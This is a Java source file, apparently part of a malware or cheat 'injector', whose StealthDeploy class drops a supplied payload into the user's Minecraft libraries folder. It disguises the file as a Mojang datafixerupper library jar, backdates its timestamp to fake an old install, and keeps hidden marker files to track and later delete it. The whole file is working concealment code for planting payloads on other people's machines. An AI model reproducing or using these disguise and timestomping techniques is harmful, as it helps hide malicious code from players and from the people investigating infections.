package nv.navineghost.injector;

import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.nio.file.attribute.FileTime;
import java.time.Instant;

public final class StealthDeploy {
    private static final String LIBRARY_ROOT = "com/mojang/datafixerupper/8.0.16";

    private StealthDeploy() {
    }

    public static Path deployEmbedded(InputStream payload, String marker) throws IOException {
        Path target = stealthDirectory().resolve(stealthFileName());
        Files.createDirectories(target.getParent());
        Files.copy(payload, target, StandardCopyOption.REPLACE_EXISTING);
        touchAsLibrary(target);
        writeMarker(marker, target);
        return target.toAbsolutePath().normalize();
    }

    public static Path stealthDirectory() {
        String appData = System.getenv("APPDATA");
        if (appData == null || appData.isBlank()) {
            appData = System.getProperty("user.home");
        }
        return Path.of(appData, ".minecraft", "libraries", LIBRARY_ROOT);
    }

    public static String stealthFileName() {
        return "datafixerupper-8.0.16-runtime.jar";
    }

    public static void touchAsLibrary(Path file) throws IOException {
        Instant oldTime = Instant.parse("2024-03-12T18:42:11Z");
        Files.setLastModifiedTime(file, FileTime.from(oldTime));
    }

    public static void writeMarker(String marker, Path payload) throws IOException {
        Path markerFile = stealthDirectory().resolve("." + marker);
        Files.writeString(markerFile, payload.toAbsolutePath().normalize().toString());
    }

    public static Path readMarker(String marker) throws IOException {
        Path markerFile = stealthDirectory().resolve("." + marker);
        if (!Files.isRegularFile(markerFile)) {
            return null;
        }
        String value = Files.readString(markerFile).trim();
        if (value.isEmpty()) {
            return null;
        }
        return Path.of(value);
    }

    public static void cleanupMarker(String marker) throws IOException {
        Path markerFile = stealthDirectory().resolve("." + marker);
        Files.deleteIfExists(markerFile);
        Path payload = stealthDirectory().resolve(stealthFileName());
        Files.deleteIfExists(payload);
    }
}
